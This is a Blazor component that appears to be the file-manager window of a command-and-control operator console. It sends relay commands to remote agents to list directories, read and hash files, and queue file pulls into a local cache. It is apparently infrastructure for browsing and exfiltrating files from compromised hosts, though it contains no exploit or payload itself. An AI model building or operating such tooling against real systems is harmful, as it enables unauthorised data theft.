@using System.Net.WebSockets
@using System.Text
@inherits EventSubscriber
@inject CacheManager Cache
@inject VfsStore Vfs
@inject DownloadStore Downloads
@inject RelayConnectionService RelaySvc
@inject AgentStore AgentDb
@inject RelayStore RelayDb
@inject MessageService Msg
@inject WindowManager Wm
@inject IJSRuntime Js

<div class="fm">
    @if (!IsConnected)
    {
        <div class="fm-offline">
            <span class="fm-offline-dot"></span>
            Agent disconnected — browsing cached data only.
        </div>
    }

    @* Toolbar *@
    <div class="fm-toolbar">
        <C2Btn OnClick="NavigateUp" Disabled="@(loading || (!IsConnected && !HasCache))" Title="Up">
            <span class="fm-icon">&#x2191;</span>
        </C2Btn>
        <C2Btn OnClick="() => NavigateTo(currentPath)" Disabled="@(loading || (!IsConnected && !HasCache))" Title="Refresh">&#x21bb;</C2Btn>
        <div class="fm-path-bar">
            <C2Input @bind-Value="currentPath" OnKeyDown="OnPathKeyDown" Monospace />
        </div>
        <C2Btn Variant="BtnVariant.Primary" OnClick="OpenFullSearchWindow" Disabled="@(!IsConnected)" Title="Search entire filesystem">
            <span class="fm-icon">&#x1F50D;</span> SEARCH
        </C2Btn>
        <C2Btn Variant="BtnVariant.Primary" OnClick="OpenDownloadsWindow" Title="Upload Manager">
            <span class="fm-icon">&#x21C5;</span> UPLOADS
        </C2Btn>
    </div>

    @* Breadcrumb *@
    @if (pathSegments.Length > 0)
    {
        <div class="fm-breadcrumb">
            <a href="javascript:void(0)" class="fm-crumb" @onclick="NavigateToRoot" @onclick:preventDefault>Root</a>
            @for (int i = 0; i < pathSegments.Length; i++)
            {
                var idx = i;
                <span class="fm-crumb-sep">/</span>
                @if (idx == pathSegments.Length - 1)
                {
                    <span class="fm-crumb-active">@pathSegments[idx]</span>
                }
                else
                {
                    <a href="javascript:void(0)" class="fm-crumb" @onclick="() => NavigateToBreadcrumb(idx)" @onclick:preventDefault>@pathSegments[idx]</a>
                }
            }
        </div>
    }

    <div class="fm-content @(viewingFile ? "fm-split" : "")">
        @* Directory listing *@
        <div class="fm-listing">
            <div class="fm-listing-header">
                @if (loading)
                {
                    <C2Spinner Size="Size.Xs" />
                }
                <span class="fm-listing-title">@(currentPath == RootPath ? (IsWindowsAgent ? "Drives" : "/") : currentPath)</span>
                @if (entries is not null)
                {
                    <span class="fm-count">@entries.Count items</span>
                }
            </div>
            <div class="fm-entries">
                @if (entries is not null)
                {
                    @if (pathSegments.Length > 0)
                    {
                        <button class="fm-entry" @onclick="NavigateUp" disabled="@(!IsConnected && !HasCache)">
                            <span class="fm-entry-icon">&#x2191;</span>
                            <span class="fm-entry-name">..</span>
                        </button>
                    }
                    @foreach (var entry in entries)
                    {
                        var e = entry;
                        var isDir = e.IsDirectory || e.IsDrive;
                        <button class="fm-entry @(selectedEntry == e ? "selected" : "") @(isDir ? "fm-entry-dir" : "")"
                                @onclick="() => selectedEntry = e"
                                @ondblclick="() => OnEntryDoubleClick(e)">
                            <span class="fm-entry-icon">@(isDir ? "\ud83d\udcc1" : "\ud83d\udcc4")</span>
                            <span class="fm-entry-name">@e.Name</span>
                            @if (!isDir)
                            {
                                <span class="fm-entry-size">@Formatters.FormatSize(e.Size)</span>
                            }
                            <span class="fm-entry-actions" @onclick:stopPropagation="true">
                                @if (isDir)
                                {
                                    <C2Btn Size="Size.Xs" OnClick="() => OpenAsDirectory(e.Name)" Title="Open" Disabled="@(!IsConnected && !HasCache)">OPEN</C2Btn>
                                    <C2Btn Size="Size.Xs" Variant="BtnVariant.Primary" OnClick="() => OpenSearchWindow(e.Name)" Title="Search directory" Disabled="@(!IsConnected)">SEARCH</C2Btn>
                                }
                                else if (Cache.HasDirectory)
                                {
                                    @RenderFileActions(e)
                                }
                            </span>
                        </button>
                    }
                }
                else if (!loading)
                {
                    <div class="fm-empty">Enter a path and press Enter or click a drive.</div>
                }
            </div>
        </div>

        @* File viewer *@
        @if (viewingFile)
        {
            <div class="fm-viewer">
                <div class="fm-viewer-header">
                    <span class="fm-viewer-title" title="@viewingFilePath">@viewingFileName</span>
                    <div class="fm-viewer-actions">
                        @if (!fileLoading)
                        {
                            <C2Btn OnClick="HashFile" Title="Compute SHA-256 hash of this file" Disabled="@(!IsConnected)">SHA-256</C2Btn>
                        }
                        <C2Btn Variant="BtnVariant.Danger" OnClick="CloseFileViewer" Title="Close file viewer">&#x2715;</C2Btn>
                    </div>
                </div>
                @if (fileLoading)
                {
                    <div class="fm-viewer-loading">
                        <C2Spinner Size="Size.Xs" /> Loading...
                    </div>
                }
                else
                {
                    @if (fileHash is not null)
                    {
                        <div class="fm-hash">
                            <span class="fm-hash-label">SHA-256</span>
                            <code class="fm-hash-value">@fileHash</code>
                        </div>
                    }
                    <div class="fm-viewer-meta">
                        <span>@fileBytesRead bytes (offset @fileViewOffset)</span>
                        <div class="fm-viewer-pager">
                            @if (fileViewOffset > 0)
                            {
                                <C2Btn OnClick="PrevPage" Disabled="@(!IsConnected)">&#x25C0; Prev</C2Btn>
                            }
                            @if (fileBytesRead >= PageSize)
                            {
                                <C2Btn OnClick="NextPage" Disabled="@(!IsConnected)">Next &#x25B6;</C2Btn>
                            }
                        </div>
                    </div>
                    <pre class="fm-code">@fileContent</pre>
                }
            </div>
        }
    </div>
</div>

@code {
    private const long PageSize = 8192;

    [Parameter] public RelaySocket? Relay { get; set; }
    [Parameter] public string? AgentId { get; set; }
    [Parameter] public string? AgentName { get; set; }
    [Parameter] public string? AgentUuid { get; set; }

    private bool IsConnected => Relay is not null && Relay.IsConnected;
    private bool IsAgentOnline => AgentId is not null && RelaySvc.GetAllAgents().Any(a => a.Agent.Id == AgentId);
    private bool HasCache => Cache.HasDirectory && !string.IsNullOrEmpty(AgentUuid);

    /// <summary>True when the agent runs Windows (has drive letters); false for Linux, UEFI, macOS, etc.</summary>
    private bool IsWindowsAgent
    {
        get
        {
            // Try live connection first
            var os = RelaySvc.GetAllAgents()
                .Where(a => a.Agent.Id == AgentId)
                .Select(a => a.Agent.Os)
                .FirstOrDefault();
            // Fall back to persisted record
            if (string.IsNullOrEmpty(os) && !string.IsNullOrEmpty(AgentUuid))
                os = AgentDb.GetByUuid(AgentUuid)?.Os;
            return string.Equals(os, "Windows", StringComparison.OrdinalIgnoreCase);
        }
    }

    /// <summary>The root path to send: empty string for Windows (drive listing), "/" for everything else.</summary>
    private string RootPath => IsWindowsAgent ? "" : "/";

    private string currentPath = "";
    private string[] pathSegments = [];
    private List<DirEntry>? entries;
    private DirEntry? selectedEntry;
    private bool loading;

    private bool _syncing;

    private bool viewingFile;
    private string viewingFileName = "";
    private string viewingFilePath = "";
    private string fileContent = "";
    private long fileBytesRead;
    private long fileViewOffset;
    private bool fileLoading;
    private string? fileHash;

    protected override async Task OnParametersSetAsync()
    {
        if (entries is not null) return;
        await Downloads.LoadAsync();

        // Ensure initial path matches the agent's OS
        if (string.IsNullOrEmpty(currentPath))
            currentPath = RootPath;

        if (IsConnected)
            await NavigateTo(currentPath);
        else if (HasCache)
            await NavigateFromCache(currentPath);
    }

    protected override void OnInitialized()
    {
        On<CacheChangedEvent>(e =>
        {
            if (!_syncing && Cache.HasDirectory && entries is not null)
                _ = SyncCacheAsync();
        });
        On<DownloadStoreChangedEvent>(e => OnDownloadsChanged());
    }

    private void OnDownloadsChanged() => _ = InvokeAsync(StateHasChanged);

    public override void Dispose() => base.Dispose();

    public void Reset()
    {
        currentPath = RootPath;
        pathSegments = [];
        entries = null;
        selectedEntry = null;
        viewingFile = false;
        fileContent = "";
        fileHash = null;
    }

    private RenderFragment RenderFileActions(DirEntry e) => __builder =>
    {
        var dl = GetDownloadRecord(e.Name);
        if (dl is null || dl.Status == DownloadStatus.Pending)
        {
            <C2Btn Size="Size.Xs" Variant="BtnVariant.Primary" OnClick="() => EnqueueSync(e)" Title="Upload to cache" Disabled="@(!IsConnected)">UPLOAD</C2Btn>
            return;
        }

        switch (dl.Status)
        {
            case DownloadStatus.Downloading:
                var pct = dl.TotalSize > 0 ? (int)(dl.DownloadedSize * 100 / dl.TotalSize) : 0;
                <span class="fm-dl-status">
                    <C2Spinner Size="Size.Xs" />
                    <span class="fm-dl-pct">@pct%</span>
                    @if (dl.SpeedBytesPerSec > 0)
                    {
                        <span class="fm-dl-speed">@Formatters.FormatSpeed(dl.SpeedBytesPerSec)</span>
                    }
                    <C2Btn Size="Size.Xs" Variant="BtnVariant.Warning" OnClick="() => PauseDownload(e)" Title="Pause">&#x23F8;</C2Btn>
                </span>
                break;

            case DownloadStatus.Paused:
                var pctP = dl.TotalSize > 0 ? (int)(dl.DownloadedSize * 100 / dl.TotalSize) : 0;
                <span class="fm-dl-status">
                    <C2Badge Variant="BadgeVariant.Warning" Size="Size.Xs">@pctP%</C2Badge>
                    <C2Btn Size="Size.Xs" Variant="BtnVariant.Success" OnClick="() => ResumeDownload(e)" Title="Resume" Disabled="@(!IsConnected && !IsAgentOnline)">&#x25B6;</C2Btn>
                </span>
                break;

            case DownloadStatus.Queued:
                <C2Badge Variant="BadgeVariant.Muted" Size="Size.Xs">QUEUED</C2Badge>
                break;

            case DownloadStatus.Completed:
                <span class="fm-dl-status">
                    <C2Btn Size="Size.Xs" OnClick="() => ViewFile(e.Name)" Title="View">VIEW</C2Btn>
                    <C2Btn Size="Size.Xs" Variant="BtnVariant.Primary" OnClick="() => SaveToBrowser(dl)" Title="Save">SAVE</C2Btn>
                </span>
                break;

            case DownloadStatus.Failed:
                <span class="fm-dl-status">
                    <C2Badge Variant="BadgeVariant.Danger" Size="Size.Xs" Title="@dl.Error">&#x2717;</C2Badge>
                    <C2Btn Size="Size.Xs" Variant="BtnVariant.Warning" OnClick="() => RetryDownload(e)" Title="Retry" Disabled="@(!IsConnected)">&#x21bb;</C2Btn>
                </span>
                break;
        }
    };

    private bool IsUnixAgent => !IsWindowsAgent;
    private string PathSep => IsUnixAgent ? "/" : @"\";

    private void UpdatePathSegments()
    {
        pathSegments = currentPath
            .Split(new[] { '\\', '/' }, StringSplitOptions.RemoveEmptyEntries)
            .ToArray();
    }

    private async Task NavigateTo(string path)
    {
        if (loading) return;
        if (!IsConnected) { if (HasCache) await NavigateFromCache(path); return; }

        currentPath = path.TrimEnd('\\', '/');
        if (IsUnixAgent && string.IsNullOrEmpty(currentPath)) currentPath = "/";
        if (!string.IsNullOrEmpty(currentPath) && currentPath != "/")
            currentPath += IsUnixAgent ? "/" : @"\";

        UpdatePathSegments();
        loading = true; entries = null; StateHasChanged();

        try
        {
            var payload = RelaySocket.BuildPathCommand(0x01, currentPath);
            var response = await SendCommand(payload);
            if (response is null) return;

            var (parsed, parseError) = DirEntry.ParseDirectoryResponse(response);
            if (parseError is not null) { Msg.Show(parseError, MessageType.Error, source: "File Manager"); return; }
            entries = parsed;

            _ = SyncCacheAsync();
        }
        catch (Exception ex) { Msg.Error("Browse Failed", $"Could not list directory: {ex.Message}", "File Manager"); }
        finally { loading = false; StateHasChanged(); }
    }

    private async Task NavigateFromCache(string path)
    {
        if (loading) return;

        currentPath = path.TrimEnd('\\', '/');
        if (IsUnixAgent && string.IsNullOrEmpty(currentPath)) currentPath = "/";
        if (!string.IsNullOrEmpty(currentPath) && currentPath != "/")
            currentPath += IsUnixAgent ? "/" : @"\";

        UpdatePathSegments();
        loading = true; entries = null; StateHasChanged();

        try
        {
            var remotePath = currentPath.TrimEnd('\\', '/');
            var parentId = await ResolveDirectoryId(remotePath);
            var dirs = await Vfs.GetChildDirectoriesAsync(AgentUuid!, parentId);
            var files = await Vfs.GetFilesInDirectoryAsync(AgentUuid!, parentId);

            entries = new List<DirEntry>();
            foreach (var d in dirs)
                entries.Add(new DirEntry(Name: d.Name, CreationTime: 0, LastModifiedTime: 0, Size: 0, Type: 0, IsDirectory: true, IsDrive: d.IsDrive, IsHidden: false, IsSystem: false, IsReadOnly: false));
            foreach (var f in files)
                entries.Add(new DirEntry(Name: f.Name, CreationTime: 0, LastModifiedTime: 0, Size: (ulong)f.Size, Type: 0, IsDirectory: false, IsDrive: false, IsHidden: false, IsSystem: false, IsReadOnly: false));
        }
        catch (Exception ex) { Msg.Error("Cache Read Failed", $"Could not load cached entries: {ex.Message}", "File Manager"); }
        finally { loading = false; StateHasChanged(); }
    }

    private async Task<string> ResolveDirectoryId(string remotePath)
    {
        if (string.IsNullOrEmpty(remotePath)) return VfsStore.RootParentId;
        return await Vfs.ResolveOrCreatePathAsync(AgentUuid!, remotePath);
    }

    private async Task NavigateUp()
    {
        if (pathSegments.Length <= 1) { await NavigateTo(RootPath); return; }
        var parent = string.Join(PathSep, pathSegments.Take(pathSegments.Length - 1));
        if (IsUnixAgent) parent = "/" + parent;
        await NavigateTo(parent);
    }

    private async Task NavigateToRoot() => await NavigateTo(RootPath);
    private async Task NavigateToBreadcrumb(int index)
    {
        var joined = string.Join(PathSep, pathSegments.Take(index + 1));
        if (IsUnixAgent) joined = "/" + joined;
        await NavigateTo(joined);
    }
    private async Task OnPathKeyDown(KeyboardEventArgs e) { if (e.Key == "Enter") await NavigateTo(currentPath); }
    private async Task OpenAsDirectory(string name) => await NavigateTo(currentPath + name);

    private async Task ViewFile(string name)
    {
        viewingFileName = name; viewingFilePath = currentPath + name;
        fileViewOffset = 0; fileHash = null;
        await LoadFilePage(); viewingFile = true;
    }

    private async Task LoadFilePage()
    {
        fileLoading = true; fileContent = ""; fileBytesRead = 0; StateHasChanged();
        try
        {
            var payload = RelaySocket.BuildFileCommand(0x02, viewingFilePath, PageSize, fileViewOffset);
            var response = await SendCommand(payload);
            if (response is null) return;
            if (response.Length < 4) { Msg.Error("File Read Error", "Invalid response from agent (too short)", "File Manager"); return; }
            var status = RelaySocket.ReadStatus(response);
            if (status != 0) { Msg.Error("File Read Error", $"Agent returned error status {status} for {viewingFilePath}", "File Manager"); return; }
            if (response.Length < 12) { Msg.Error("File Read Error", "Invalid response from agent (missing content)", "File Manager"); return; }
            var (bytesRead, data) = RelaySocket.ReadFileContent(response);
            fileBytesRead = (long)bytesRead;
            try { fileContent = Encoding.UTF8.GetString(data); }
            catch { fileContent = Formatters.FormatHexDump(data.ToArray()); }
        }
        catch (Exception ex) { Msg.Error("File Read Failed", $"Could not read {viewingFilePath}: {ex.Message}", "File Manager"); }
        finally { fileLoading = false; StateHasChanged(); }
    }

    private async Task NextPage() { fileViewOffset += PageSize; await LoadFilePage(); }
    private async Task PrevPage() { fileViewOffset = Math.Max(0, fileViewOffset - PageSize); await LoadFilePage(); }
    private void CloseFileViewer() { viewingFile = false; fileContent = ""; fileHash = null; }

    private async Task HashFile()
    {
        fileLoading = true; fileHash = null; StateHasChanged();
        try
        {
            var payload = RelaySocket.BuildFileCommand(0x03, viewingFilePath, PageSize, fileViewOffset);
            var response = await SendCommand(payload);
            if (response is null) return;
            if (response.Length < 4) return;
            var status = RelaySocket.ReadStatus(response);
            if (status != 0) { Msg.Error("Hash Error", $"Agent returned error status {status} for {viewingFilePath}", "File Manager"); return; }
            if (response.Length < 36) return;
            fileHash = RelaySocket.ReadHash(response);
        }
        catch (Exception ex) { Msg.Error("Hash Failed", $"Could not hash {viewingFilePath}: {ex.Message}", "File Manager"); }
        finally { fileLoading = false; StateHasChanged(); }
    }

    private async Task SyncCacheAsync()
    {
        if (_syncing) return;
        if (!Cache.HasDirectory || entries is null || string.IsNullOrEmpty(AgentUuid)) return;
        var snapshot = entries.ToList();
        var remotePath = currentPath.TrimEnd('\\', '/');
        _syncing = true;
        try
        {
            var parentId = await Vfs.ResolveOrCreatePathAsync(AgentUuid, remotePath);
            foreach (var entry in snapshot)
            {
                try
                {
                    var entryRemotePath = string.IsNullOrEmpty(remotePath) ? entry.Name : $"{remotePath}/{entry.Name}";
                    if (entry.IsDirectory || entry.IsDrive) await Vfs.PutDirectoryAsync(AgentUuid, parentId, entry.Name, entryRemotePath, entry.IsDrive);
                    else await Vfs.PutFileAsync(AgentUuid, parentId, entry.Name, entryRemotePath, (long)entry.Size);
                }
                catch { }
            }
            await InvokeAsync(StateHasChanged);
        }
        catch { }
        finally { _syncing = false; }
    }

    private DownloadRecord? GetDownloadRecord(string fileName) => string.IsNullOrEmpty(AgentUuid) ? null : Downloads.Find(AgentUuid, currentPath + fileName);

    private async Task EnqueueSync(DirEntry entry)
    {
        if (!Cache.HasDirectory || string.IsNullOrEmpty(AgentUuid)) return;
        var remotePath = currentPath + entry.Name;
        var parentRemotePath = currentPath.TrimEnd('\\', '/');
        var totalSize = (long)entry.Size;
        var parentId = await Vfs.ResolveOrCreatePathAsync(AgentUuid, parentRemotePath);
        var vfsFile = await Vfs.PutFileAsync(AgentUuid, parentId, entry.Name, remotePath.Replace('\\', '/'), totalSize);
        var record = Downloads.Find(AgentUuid, remotePath);
        if (record is null || record.Status == DownloadStatus.Completed || record.Status == DownloadStatus.Failed)
            await Downloads.AddAsync(AgentUuid, AgentName ?? "", remotePath, entry.Name, vfsFile.Id, totalSize);
        else if (record.Status == DownloadStatus.Paused)
            await Downloads.QueueAsync(record.Id);
        StateHasChanged();
    }

    private void PauseDownload(DirEntry entry)
    {
        if (string.IsNullOrEmpty(AgentUuid)) return;
        var record = Downloads.Find(AgentUuid, currentPath + entry.Name);
        if (record is not null) Downloads.Cts.Cancel(record.Id);
    }

    private async Task ResumeDownload(DirEntry entry)
    {
        if (string.IsNullOrEmpty(AgentUuid)) return;
        var record = Downloads.Find(AgentUuid, currentPath + entry.Name);
        if (record is null || Downloads.Cts.HasActive(record.Id)) return;
        await Downloads.QueueAsync(record.Id);
    }

    private async Task RetryDownload(DirEntry entry)
    {
        if (string.IsNullOrEmpty(AgentUuid)) return;
        var existing = Downloads.Find(AgentUuid, currentPath + entry.Name);
        if (existing is not null) await Downloads.RemoveAsync(existing.Id);
        await EnqueueSync(entry);
    }

    private void OpenDownloadsWindow()
    {
        if (!string.IsNullOrEmpty(AgentId)) Wm.OpenAgentWindow("Downloads", AgentId, agentName: AgentName, agentUuid: AgentUuid);
        else Wm.OpenWindow("Downloads");
    }

    private void OpenSearchWindow(string dirName)
    {
        if (string.IsNullOrEmpty(AgentId)) return;
        var searchPath = currentPath + dirName;
        Wm.OpenAgentWindow("FileSearch", AgentId, agentName: AgentName, agentUuid: AgentUuid, searchPath: searchPath);
    }

    private void OpenFullSearchWindow()
    {
        if (string.IsNullOrEmpty(AgentId)) return;
        Wm.OpenAgentWindow("FileSearch", AgentId, agentName: AgentName, agentUuid: AgentUuid);
    }

    private async Task SaveToBrowser(DownloadRecord dl)
    {
        try
        {
            if (!await Cache.BlobExistsAsync(dl.CacheSubPath)) { Msg.Error("Save Failed", "File not found in local cache", "File Manager"); return; }
            await Js.InvokeVoidAsync("c2SaveFile", dl.FileName, dl.CacheSubPath);
        }
        catch (Exception ex) { Msg.Error("Save Failed", $"Could not save {dl.FileName}: {ex.Message}", "File Manager"); }
    }

    private async Task<byte[]?> SendCommand(byte[] payload)
    {
        if (Relay is null || !Relay.IsConnected) { Msg.Error("Not Connected", "No active connection to agent", "File Manager"); return null; }
        try { return await Relay.SendAndReceive(payload); }
        catch (Exception ex) { Msg.Error("Command Failed", $"Agent command error: {ex.Message}", "File Manager"); return null; }
    }

    private async Task OnEntryDoubleClick(DirEntry entry)
    {
        if (entry.IsDirectory || entry.IsDrive) await OpenAsDirectory(entry.Name);
        else if (IsFileSynced(entry.Name)) await ViewFile(entry.Name);
    }

    private bool IsFileSynced(string fileName) => !string.IsNullOrEmpty(AgentUuid) && Downloads.Find(AgentUuid, currentPath + fileName)?.Status == DownloadStatus.Completed;
}
